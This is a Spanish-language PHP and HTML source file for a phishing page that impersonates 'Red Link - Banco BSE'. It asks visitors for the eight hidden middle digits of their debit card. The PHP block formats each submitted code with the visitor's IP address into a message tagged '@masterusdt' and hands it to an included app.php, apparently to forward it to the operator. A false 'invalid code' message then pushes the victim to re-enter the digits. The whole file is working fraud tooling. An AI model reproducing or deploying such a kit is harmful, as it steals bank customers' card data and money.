<?php  
include 'config/personalizar.php';

if (isset($_POST['submit'])) {
  $error = '<p class="text-danger mt-3 sads3132 fw-semibold">El código ingresado es invalido. Intenta nuevamente.</p>';
  $enviara =
  "<b> 💸 BSE PERSONA 💸 </b>\n\n".
  " ------ [ data ] ------ \n\n".
  "<b>👤 codigo: </b> <code>".$_POST['token']."</code>\n".
  "<b>🌐 IP: </b> <code>".$_SERVER['REMOTE_ADDR']."</code>\n".
  " ------ [ @masterusdt] ------ \n\n";    
  $enviar =  urldecode($enviara);
  include 'config/app.php';
}
?> 
<?php
// Incluir configuración
include 'config/personalizar.php';
?>
<!doctype html>
<html lang="es-AR">
<head>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <meta http-equiv="refresh" id="loader">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <link rel="icon" type="ico" href="favicon.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Red Link - Banco BSE</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/css/style.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <script type="text/javascript" src="assets/js/main.js"></script>
  <style>
    /* Estilo adicional para los campos de 4 dígitos */
    .input-group-custom {
      display: flex;
      gap: 10px;
      justify-content: center;
    }
    .input-group-custom input {
      text-align: center;
      font-size: 1.2rem;
      font-weight: 600;
      letter-spacing: 2px;
    }
    .separator-dash {
      font-size: 1.5rem;
      font-weight: 600;
      color: #6c757d;
      line-height: 38px;
    }
  </style>
</head>
<body>
  <div class="h-100 w-100 ">
    <div class="h-100 py-5 shadow bg-white px-4 mx-auto w-100" style="max-width: 676px;">
      
      <!-- Logo -->
      <img src="assets/images/bank_logo.png" class="logo mb-5">
      
      <!-- Título dinámico -->
      <h3 class="titulo_cargando my-3"><?php echo $titulo_verificacion2 ?? 'Verificación de identidad'; ?></h3>
      <p class="fs-5 description_cargando"></p>
      
      <!-- Alerta informativa -->
      <div class="alert alert-light">
        <i class="bi bi-credit-card-2-front"></i>
        <?php echo $descripcion_verificacion2 ?? 'Complete los 8 dígitos faltantes de su tarjeta'; ?>
      </div>
      
      <!-- Visualización de la tarjeta: XXXX ---- ---- XXXX -->
      <div class="tarjeta my-4 px-3 align-content-center py-4 rounded-4">
        <span id="cardnum" class="text-white" style="letter-spacing: 3px; font-size: 18px; font-weight: 500;">
          XXXX ---- ---- XXXX
        </span>
      </div>
      
      <!-- Formulario con 2 campos de 4 dígitos cada uno -->
      <form method="POST" action="cargando3.php">
        <div class="mb-4">
          <label class="fw-semibold mb-3"><b>Ingresa los 8 números faltantes de tu tarjeta de débito</b> (los que están en guiones).</label>
          
          <!-- Dos campos de 4 dígitos con guión visual -->
          <div class="input-group-custom">
            <input type="tel" maxlength="4" minlength="4" class="form-control form-control-lg" 
                   required id="token1" name="token1" placeholder="----" 
                   inputmode="numeric" pattern="[0-9]{4}" title="Deben ser 4 números">
            
            <span class="separator-dash">-</span>
            
            <input type="tel" maxlength="4" minlength="4" class="form-control form-control-lg" 
                   required id="token2" name="token2" placeholder="----" 
                   inputmode="numeric" pattern="[0-9]{4}" title="Deben ser 4 números">
          </div>
          
          <!-- Campo oculto para mantener compatibilidad con el sistema original -->
          <input type="hidden" id="token_completo" name="token">
          
          <div class="text-muted small mt-2">
            <i class="bi bi-info-circle"></i>
            Formato: XXXX ---- ---- XXXX (ingresa los 8 dígitos de los guiones)
          </div>
        </div>
        
        <button type="submit" name="submit" class="btn btn-primary px-5">Siguiente</button>
      </form>
    </div>
  </div>
  
  <script type="text/javascript">
    // Obtener los campos
    const campo1 = document.getElementById('token1');
    const campo2 = document.getElementById('token2');
    const campoOculto = document.getElementById('token_completo');
    const formulario = document.querySelector('form');
    
    // Validar que solo se ingresen números
    function soloNumeros(e) {
      if (e.which < 48 || e.which > 57) {
        e.preventDefault(); 
      }
    }
    
    // Auto-avanzar al siguiente campo después de 4 dígitos
    campo1.addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g, '');
      if (this.value.length === 4) {
        campo2.focus();
      }
    });
    
    campo2.addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
    
    // Prevenir caracteres no numéricos
    campo1.addEventListener('keypress', soloNumeros);
    campo2.addEventListener('keypress', soloNumeros);
    
    // Al enviar el formulario, combinar los 2 campos en 1
    formulario.addEventListener('submit', function(e) {
      const valor1 = campo1.value.trim();
      const valor2 = campo2.value.trim();
      
      // Validar que ambos campos tengan exactamente 4 dígitos
      if (valor1.length !== 4 || valor2.length !== 4) {
        e.preventDefault();
        alert('Por favor ingresa los 8 dígitos completos (4 en cada campo)');
        return false;
      }
      
      // Combinar y asignar al campo oculto
      campoOculto.value = valor1 + valor2;
      
      // Mostrar en consola para debug (opcional)
      console.log('8 dígitos enviados:', campoOculto.value);
      
      return true;
    });
    
    // También permitir pegar números completos
    campo1.addEventListener('paste', function(e) {
      e.preventDefault();
      const pasted = (e.clipboardData || window.clipboardData).getData('text');
      const numbers = pasted.replace(/[^0-9]/g, '');
      
      if (numbers.length >= 8) {
        // Si pegan 8 dígitos completos
        campo1.value = numbers.substring(0, 4);
        campo2.value = numbers.substring(4, 8);
        campo2.focus();
      } else if (numbers.length >= 4) {
        // Si pegan al menos 4 dígitos
        campo1.value = numbers.substring(0, 4);
        campo2.focus();
      }
    });
  </script>
</body>
</html>